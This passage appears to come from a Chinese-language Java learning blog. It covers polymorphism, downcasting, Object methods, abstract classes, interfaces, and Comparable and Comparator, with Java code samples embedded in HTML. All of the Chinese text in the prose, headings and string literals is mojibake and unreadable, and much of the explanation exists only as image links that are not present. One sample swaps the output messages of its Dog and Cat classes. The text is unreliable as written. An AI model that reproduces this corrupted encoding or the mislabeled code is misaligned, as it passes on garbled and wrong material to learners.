   showEat(european);    &#125;    public static void showEat(Programmer programmer)&#123;        programmer.eat();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306120428090.png" alt="image-20220306120428090"></p><p>è¿™æ ·å†™,èŠ‚çœäº†å¾ˆå¤šä»£ç é‡</p><p>ç”±äºè¿™é‡Œçš„Programmer programmer æ˜¯å½¢å‚ï¼Œæ‰€ä»¥ä¼šæœ‰</p><p>Programmer programmer = chinese/india/european;</p><p>æ»¡è¶³çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘å­ç±»çš„å¯¹è±¡</p><h2 id="å¤šæ€ä½œç”¨äºŒå­˜å‚¨ä¸åŒç±»å‹æ•°æ®"><a href="#å¤šæ€ä½œç”¨äºŒå­˜å‚¨ä¸åŒç±»å‹æ•°æ®" class="headerlink" title="å¤šæ€ä½œç”¨äºŒå­˜å‚¨ä¸åŒç±»å‹æ•°æ®"></a>å¤šæ€ä½œç”¨äºŒå­˜å‚¨ä¸åŒç±»å‹æ•°æ®</h2><pre><code class="java">package com.sakura.duotai2;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;åŠ¨ç‰©åƒé¥­&quot;);    &#125;&#125;class Dog extends Animal&#123;    void eat()&#123;        System.out.println(&quot;çŒ«åƒé±¼&quot;);    &#125;&#125;class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;ç‹—åƒè‚‰&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai2;public class Test &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30&#125;;//è¿™æ˜¯ä¸€ä¸ªæ•°ç»„å®ƒåªèƒ½å­˜å‚¨åŒä¸€ç§ç±»å‹æ•°æ®        Animal [] aniarr = new Animal[2];        Dog dog = new Dog();        Cat cat = new Cat();        aniarr[0] = dog;        aniarr[1] = cat;        for(Animal a:aniarr)&#123;            a.eat();        &#125;    &#125;&#125;</code></pre><p>æ­¤å¤„çš„catå’Œdogæ˜¯ä¸åŒç±»å‹çš„ç¤ºä¾‹å¯¹è±¡ï¼Œä½†æ˜¯éƒ½æ”¾åœ¨äº†åŒä¸€ä¸ªæ•°ç»„</p><h2 id="å¤šæ€åº”ç”¨ä¸‰æ–¹æ³•çš„è¿”å›å€¼"><a href="#å¤šæ€åº”ç”¨ä¸‰æ–¹æ³•çš„è¿”å›å€¼" class="headerlink" title="å¤šæ€åº”ç”¨ä¸‰æ–¹æ³•çš„è¿”å›å€¼"></a>å¤šæ€åº”ç”¨ä¸‰æ–¹æ³•çš„è¿”å›å€¼</h2><p>ç¤ºä¾‹ä»£ç :</p><p>Programmer.java</p><pre><code class="java">package com.sakura.duotai3;public class Programmer &#123;    void work()&#123;        System.out.println(&quot;ç¨‹åºå‘˜ å†™ä»£ç &quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void work()&#123;        System.out.println(&quot;ä¸­å›½ ç¨‹åºå‘˜å†™ä»£ç &quot;);    &#125;&#125;class India extends Programmer&#123;    void work()&#123;        System.out.println(&quot;å°åº¦ ç¨‹åºå‘˜å†™ä»£ç &quot;);    &#125;&#125;class European extends Programmer&#123;    void work()&#123;        System.out.println(&quot;æ¬§æ´² ç¨‹åºå‘˜å†™ä»£ç &quot;);    &#125;&#125;</code></pre><p>Guigu.java</p><pre><code class="java">package com.sakura.duotai3;public class Guigu &#123;    public static Programmer produce_Grammer(String country)&#123;        if(&quot;ä¸­å›½&quot;.equals(country))&#123;            return new Chinese();        &#125;else if(&quot;å°åº¦&quot;.equals(country))&#123;            return new India();        &#125;else if(&quot;æ¬§æ´²&quot;.equals(country))&#123;            return new European();        &#125;        return null;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai3;import java.util.Scanner;public class Test &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;è¯·è¾“å…¥æ‚¨éœ€è¦çš„ç¨‹åºå‘˜å›½å®¶:&quot;);        Scanner input = new Scanner(System.in);        String country = input.next();        Programmer programmer = Guigu.produce_Grammer(country);        if (programmer != null) &#123;            programmer.work();        &#125; else &#123;            System.out.println(&quot;è¿˜æ²¡æœ‰æ­¤å›½å®¶ç¨‹åºå‘˜&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153850750.png" alt="image-20220306153850750"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153923126.png" alt="image-20220306153923126"></p><h2 id="å¤šæ€çš„ç»ƒä¹ ä¸€"><a href="#å¤šæ€çš„ç»ƒä¹ ä¸€" class="headerlink" title="å¤šæ€çš„ç»ƒä¹ ä¸€"></a>å¤šæ€çš„ç»ƒä¹ ä¸€</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306154354906.png" alt="image-20220306154354906"></p><p>Traffic.java</p><pre><code class="java">package com.sakura.duotai4;public class Traffic &#123;    public void drive()&#123;        System.out.println(&quot;äº¤é€šå·¥å…·é€šè¡Œ&quot;);    &#125;&#125;class Car extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;æ±½è½¦å¥”é©°åœ¨é©¬è·¯ä¸Š&quot;);    &#125;&#125;class Bike extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;è‡ªè¡Œè½¦åœ¨é©¬è·¯ä¸Šç¼“æ…¢çš„èµ°ç€&quot;);    &#125;&#125;class Truck extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;è´§è½¦æ»¡è½½ç€è´§ç‰©ä¸å¿«ä¸æ…¢çš„å¼€ç€&quot;);    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai4;public class Test &#123;    public static void main(String[] args) &#123;        Traffic [] trarr =new Traffic[3];        trarr[0] = new Car();        trarr[1] = new Bike();        trarr[2] = new Truck();        for(Traffic a:trarr)&#123;            a.drive();        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155645389.png" alt="image-20220306155645389"></p><h2 id="å¤šæ€çš„ç»ƒä¹ äºŒ"><a href="#å¤šæ€çš„ç»ƒä¹ äºŒ" class="headerlink" title="å¤šæ€çš„ç»ƒä¹ äºŒ"></a>å¤šæ€çš„ç»ƒä¹ äºŒ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155901154.png" alt="image-20220306155901154"></p><p>ç¤ºä¾‹ä»£ç :</p><p>Employee.java</p><pre><code class="java">package com.sakura.duotai5;public class Employee &#123;    private String name;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public double earning()&#123;        return 0;    &#125;    public String getinfo()&#123;        return &quot;å§“åæ˜¯:&quot;+name+&quot; ,å®å‘å·¥èµ„&quot;+earning();    &#125;    public Employee()&#123;&#125;;    public Employee(String name) &#123;        this.name = name;    &#125;&#125;</code></pre><p>SalaryEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class SalaryEmployee extends Employee&#123;    private double salary;    private int workday;    private int offday;    public double getSalary() &#123;        return salary;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;    public int getWorkday() &#123;        return workday;    &#125;    public void setWorkday(int workday) &#123;        this.workday = workday;    &#125;    public int getOffday() &#123;        return offday;    &#125;    public void setOffday(int offday) &#123;        this.offday = offday;    &#125;    public SalaryEmployee()&#123;&#125;;    public SalaryEmployee(double salary, int workday, int offday,String name) &#123;        super(name);        this.salary = salary;        this.workday = workday;        this.offday = offday;    &#125;    @Override    public double earning() &#123;        return (getSalary()-getSalary()/getWorkday()*getOffday());    &#125;&#125;</code></pre><p>Manager.java</p><pre><code class="java">package com.sakura.duotai5;public class Manager extends SalaryEmployee&#123;    private double part;    public double earning()&#123;        return (getSalary()-getSalary()/getWorkday()*getOffday()*(1+part));    &#125;    public Manager()&#123;&#125;    public Manager(double salary, int workday, int offday, String name, double part) &#123;        super(salary, workday, offday, name);        this.part = part;    &#125;&#125;</code></pre><p>HourEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class HourEmployee extends Employee&#123;    private int hours;    private int hourmoney;    public int getHours() &#123;        return hours;    &#125;    public void setHours(int hours) &#123;        this.hours = hours;    &#125;    public int getHourmoney() &#123;        return hourmoney;    &#125;    public void setHourmoney(int hourmoney) &#123;        this.hourmoney = hourmoney;    &#125;    public double earning()&#123;        return getHours()*getHourmoney();    &#125;    public HourEmployee()&#123;&#125;    public HourEmployee(String name, int hours, int hourmoney) &#123;        super(name);        this.hours = hours;        this.hourmoney = hourmoney;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai5;public class Test &#123;    public static void main(String[] args) &#123;        Employee [] employee = new Employee[5];        SalaryEmployee s1 = new SalaryEmployee(10000,20,5,&quot;èœ¡ç¬”å°æ–°&quot;);        SalaryEmployee s2 = new SalaryEmployee(15000,20,5,&quot;å¼ ä¼Ÿ&quot;);        HourEmployee h1 = new HourEmployee(&quot;è‹¦é€¼æ‰“å·¥äºº&quot;,30,15);        HourEmployee h2 = new HourEmployee(&quot;å°ç‹&quot;,50,30);        Manager m1 = new Manager(20000,22,3,&quot;éœ¸é“æ€»è£&quot;,0.9);        employee[0] = s1;        employee[1] = s2;        employee[2] = h1;        employee[3] = h2;        employee[4] = m1;        for(Employee a:employee)&#123;            System.out.println(a.getinfo());        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306213734875.png" alt="image-20220306213734875"></p><h2 id="å‘ä¸‹è½¬å‹"><a href="#å‘ä¸‹è½¬å‹" class="headerlink" title="å‘ä¸‹è½¬å‹"></a>å‘ä¸‹è½¬å‹</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306214039535.png" alt="image-20220306214039535"></p><p>å¤šæ€çš„å‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹éƒ½æ˜¯éƒ½æ˜¯é’ˆå¯¹äºç¼–è¯‘æ—¶ç±»å‹ è¿è¡Œæ—¶ç±»å‹ä»å§‹è‡³ç»ˆä¸ä¼šå‘ç”Ÿæ”¹å˜</p><p>çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘å­ç±»çš„ç¤ºä¾‹ å°±æ˜¯å‘ä¸Šè½¬å‹(å¼Šç«¯:æ— æ³•ä½¿ç”¨å­ç±»ç‹¬æœ‰èµ„æº)ï¼š</p><pre><code class="java">Animal ani = new Cat();</code></pre><p>å‘ä¸‹è½¬å‹ï¼š</p><p>ä½¿ç”¨å­ç±»è‡ªå·±ç‹¬æœ‰çš„èµ„æºæ—¶ down casting</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306215605369.png" alt="image-20220306215605369"></p><p>ç±»ä¼¼äºå¼ºåˆ¶ç±»å‹è½¬æ¢</p><p>å‘ä¸‹è½¬å‹å‰æï¼šå·²ç»å®Œæˆäº†å‘ä¸Šè½¬å‹</p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>åˆ¤æ–­å·¦è¾¹çš„å¯¹è±¡æ˜¯å¦å±äºå³è¾¹ç±»å‹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220002482.png" alt="image-20220306220002482"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220011415.png" alt="image-20220306220011415"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306221125721.png" alt="image-20220306221125721"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306222229248.png" alt="image-20220306222229248"></p><h1 id="day11"><a href="#day11" class="headerlink" title="day11"></a>day11</h1><h2 id="éè™šæ–¹æ³•"><a href="#éè™šæ–¹æ³•" class="headerlink" title="éè™šæ–¹æ³•"></a>éè™šæ–¹æ³•</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222921425.png" alt="image-20220307222921425"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222347375.png" alt="image-20220307222347375"></p><h2 id="nativeå…³é”®å­—"><a href="#nativeå…³é”®å­—" class="headerlink" title="nativeå…³é”®å­—"></a>nativeå…³é”®å­—</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224544250.png" alt="image-20220307224544250"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224944403.png" alt="image-20220307224944403"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225003737.png" alt="image-20220307225003737"></p><h2 id="finalå…³é”®å­—"><a href="#finalå…³é”®å­—" class="headerlink" title="finalå…³é”®å­—"></a>finalå…³é”®å­—</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225623364.png" alt="image-20220307225623364"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230404578.png" alt="image-20220307230404578"></p><h2 id="Objectç±»"><a href="#Objectç±»" class="headerlink" title="Objectç±»"></a>Objectç±»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230702220.png" alt="image-20220307230702220"></p><h3 id="to-string"><a href="#to-string" class="headerlink" title="to_string"></a>to_string</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231033786.png" alt="image-20220307231033786"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231050043.png" alt="image-20220307231050043"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232014058.png" alt="image-20220307232014058"></p><p>åŸæ–¹æ³•</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232032977.png" alt="image-20220307232032977"></p><p>é‡å†™å</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232136187.png" alt="image-20220307232136187"></p><p>ç›´æ¥alt+insertæ·»åŠ å³å¯</p><h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass()"></a>getClass()</h3><p>è·å–è¿è¡Œæ—¶ç±»å‹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232536412.png" alt="image-20220307232536412"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232551295.png" alt="image-20220307232551295"></p><h3 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233825712.png" alt="image-20220307233825712"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233742142.png" alt="image-20220307233742142"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233200553.png" alt="image-20220307233200553"></p><h3 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h3><p>ç”¨äºè¿”å›å½“å‰å¯¹è±¡çš„hashç </p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234118067.png" alt="image-20220307234118067"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234327319.png" alt="image-20220307234327319"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234646637.png" alt="image-20220307234646637"></p><p>é‡å†™hashcode()æ–¹æ³•ï¼Œå°½é‡è®©ä¸åŒå¯¹è±¡äº§ç”Ÿçš„hashç ä¸ä¸€æ ·</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234725681.png" alt="image-20220307234725681"></p><h3 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000837040.png" alt="image-20220308000837040"></p><p>equals åªèƒ½æ¯”è¾ƒå¼•ç”¨ç±»å‹æ•°æ®</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307235240218.png" alt="image-20220307235240218"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000516442.png" alt="image-20220308000516442"></p><h2 id="ç©ºæŒ‡é’ˆå¼‚å¸¸"><a href="#ç©ºæŒ‡é’ˆå¼‚å¸¸" class="headerlink" title="ç©ºæŒ‡é’ˆå¼‚å¸¸"></a>ç©ºæŒ‡é’ˆå¼‚å¸¸</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004815978.png" alt="image-20220308004815978"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004823230.png" alt="image-20220308004823230"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004929031.png" alt="image-20220308004929031"></p><h2 id="æŠ½è±¡åˆè¯†"><a href="#æŠ½è±¡åˆè¯†" class="headerlink" title="æŠ½è±¡åˆè¯†"></a>æŠ½è±¡åˆè¯†</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001110049.png" alt="image-20220309001110049"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001857256.png" alt="image-20220309001857256"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003126201.png" alt="image-20220309003126201"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309002153677.png" alt="image-20220309002153677"></p><h2 id="æŠ½è±¡æ³¨æ„ç‚¹"><a href="#æŠ½è±¡æ³¨æ„ç‚¹" class="headerlink" title="æŠ½è±¡æ³¨æ„ç‚¹"></a>æŠ½è±¡æ³¨æ„ç‚¹</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003553843.png" alt="image-20220309003553843"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003622175.png" alt="image-20220309003622175"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309004543157.png" alt="image-20220309004543157"></p><h2 id="æ¥å£åˆè¯†"><a href="#æ¥å£åˆè¯†" class="headerlink" title="æ¥å£åˆè¯†"></a>æ¥å£åˆè¯†</h2><p>å¦‚ä½•å£°æ˜æ¥å£ï¼š</p><p>æ¥å£ï¼šå®šä¹‰è§„èŒƒ</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010955198.png" alt="image-20220309010955198"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010752566.png" alt="image-20220309010752566"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010914703.png" alt="image-20220309010914703"></p><p>æ¥å£ä¹Ÿæœ‰å¤šæ€</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011210309.png" alt="image-20220309011210309"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011357791.png" alt="image-20220309011357791"></p><p>æ³¨æ„ï¼š</p><p>æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•é»˜è®¤è¢« public abstract ä¿®é¥°</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011610133.png" alt="image-20220309011610133"></p><p>æ¥å£ä¸­çš„å…¨å±€é™æ€å¸¸é‡é»˜è®¤è¢«</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011859135.png" alt="image-20220309011859135"></p><p>è¿™ä¸‰ä¸ªä¿®é¥°</p><p>ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012134974.png" alt="image-20220309012134974"></p><p>ä¸€ä¸ªç±»å®ç°æ¥å£åï¼Œå¦‚æœä¸æƒ³å®ç°æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œåˆ™è‡ªå·±å¿…é¡»å˜ä¸ºæŠ½è±¡ç±»</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012443711.png" alt="image-20220309012443711"></p><hr><p>æ·»åŠ é»˜è®¤æ–¹æ³•ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012838207.png" alt="image-20220309012838207"></p><p>è¿™ä¸ªæ–¹æ³•ä¸æ˜¯æ¯ä¸ªå®ç°è¿™ä¸ªæ¥å£çš„ç±»éƒ½å¿…é¡»è¦é‡å†™çš„ï¼ŒæŒ‰éœ€ä½¿ç”¨ã€‚æ¯”å¦‚é£æœºå’Œå°é¸Ÿï¼Œåªæœ‰é£æœºéœ€è¦åŠ æ²¹ï¼Œå°é¸Ÿå¹¶ä¸éœ€è¦ã€‚</p><p>æ·»åŠ é™æ€æ–¹æ³•ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013126800.png" alt="image-20220309013126800"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013720061.png" alt="image-20220309013720061"></p><p>æ¥å£ä¹Ÿå¯ä»¥è¿›è¡Œå¤šç»§æ‰¿ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013858147.png" alt="image-20220309013858147"></p><p>ä¸€ä¸ªç±»å¯ä»¥å…ˆç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»ï¼Œå†å»å®ç°å¤šä¸ªæ¥å£ï¼Œé¡ºåºä¸èƒ½æ”¹å˜ï¼Œå¿…é¡»å…ˆç»§æ‰¿å†æ”¹å˜</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309014202863.png" alt="image-20220309014202863"></p><h2 id="æ¥å£çš„éæ­£å¸¸æƒ…å†µ"><a href="#æ¥å£çš„éæ­£å¸¸æƒ…å†µ" class="headerlink" title="æ¥å£çš„éæ­£å¸¸æƒ…å†µ"></a>æ¥å£çš„éæ­£å¸¸æƒ…å†µ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015249961.png" alt="image-20220309015249961"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015303113.png" alt="image-20220309015303113"></p><p>è¿™ä¸¤ä¸ªæ¥å£æœ‰é‡åçš„æ–¹æ³•ï¼Œå½“å®ç°çš„æ—¶å€™å°±ä¼šæŠ¥é”™</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015327271.png" alt="image-20220309015327271"></p><p>è§£å†³æ–¹æ³•ï¼šåœ¨ç±»ä¸­é‡å†™ studyæ–¹æ³•</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015415696.png" alt="image-20220309015415696"></p><p>ä½†æ˜¯ï¼Œä½†æˆ‘ä»¬æƒ³è¦è°ƒç”¨æ¥å£çš„studyæ–¹æ³•è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>é‡å†™studyåè¿™æ ·è°ƒç”¨ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015757108.png" alt="image-20220309015757108"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015510568.png" alt="image-20220309015510568"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015547202.png" alt="image-20220309015547202"></p><h2 id="comparableæ¥å£"><a href="#comparableæ¥å£" class="headerlink" title="comparableæ¥å£"></a>comparableæ¥å£</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020503383.png" alt="image-20220309020503383"></p><p>ä½¿ç”¨comparableæ¥å£å®Œæˆå¼•ç”¨æ•°æ®ç±»å‹çš„æ¯”è¾ƒ</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020938494.png" alt="image-20220309020938494"></p><p>éœ€è¦å®ç°ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021013901.png" alt="image-20220309021013901"></p><p>é‡å†™Comparable</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021220640.png" alt="image-20220309021220640"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021248580.png" alt="image-20220309021248580"></p><h1 id="day12-é¢å‘å¯¹è±¡"><a href="#day12-é¢å‘å¯¹è±¡" class="headerlink" title="day12 é¢å‘å¯¹è±¡"></a>day12 é¢å‘å¯¹è±¡</h1><h2 id="comparableæ¥å£-å†…éƒ¨æ¯”è¾ƒå™¨"><a href="#comparableæ¥å£-å†…éƒ¨æ¯”è¾ƒå™¨" class="headerlink" title="comparableæ¥å£-å†…éƒ¨æ¯”è¾ƒå™¨"></a>comparableæ¥å£-å†…éƒ¨æ¯”è¾ƒå™¨</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220317222648883.png" alt="image-20220317222648883"></p><pre><code class="java">package com.sakura.neibu;public class Test &#123;    public static void main(String[] args) &#123;    Person p1 = new Person(&quot;æç™½&quot;,40);    Person p2 = new Person(&quot;æœç”«&quot;,30);    int i = p1.compareTo(p2);    if(i&gt;0)&#123;        System.out.println(p1.name+&quot;&gt;&quot;+p2.name);    &#125;else if(i&lt;0)&#123;            System.out.println(p1.name+&quot;&lt;&quot;+p2.name);        &#125;else &#123;        System.out.println(p1.name+&quot;=&quot;+p2.name);    &#125;    &#125;&#125;class Person implements Comparable&#123;    @Override    public int compareTo(Object o) &#123;        Person p = (Person)o;        return this.age-p.age;    &#125;    String name;    int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220321223505628.png" alt="image-20220321223505628"></p><h2 id="Comparatoræ¥å£-å¤–éƒ¨æ¯”è¾ƒå™¨"><a href="#Comparatoræ¥å£-å¤–éƒ¨æ¯”è¾ƒå™¨" class="headerlink" title="Comparatoræ¥å£-å¤–éƒ¨æ¯”è¾ƒå™¨"></a>Comparatoræ¥å£-å¤–éƒ¨æ¯”è¾ƒå™¨</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322223441069.png" alt="image-20220322223441069"></p><p>ä»£ç èŒƒä¾‹:</p><p>Person.java</p><pre><code class="java">package com.sakura.waibu;public class Person &#123;    String name;    int age;    double salary;    public Person(String name, int age, double salary) &#123;        this.name = name;        this.age = age;        this.salary = salary;    &#125;    public Person() &#123;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;&#125;</code></pre><p>PerSortOfAge.java</p><pre><code class="java">package com.sakura.waibu;import java.util.Comparator;public class PersonSortOfAge implements Comparator &#123;    @Override    public int compare(Object o1, Object o2) &#123;        Person p1 = (Person)o1;        Person p2 = (Person)o2;        return p1.age-p2.age;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.waibu;public class Test &#123;    public static void main(String[] args) &#123;        Person p1 = new Person(&quot;æç™½&quot;,60,6666.55);        Person p2 = new Person(&quot;æœç”«&quot;,58,8888);        PersonSortOfAge sortOfAge = new PersonSortOfAge();        int res = sortOfAge.compare(p1,p2);        if(res 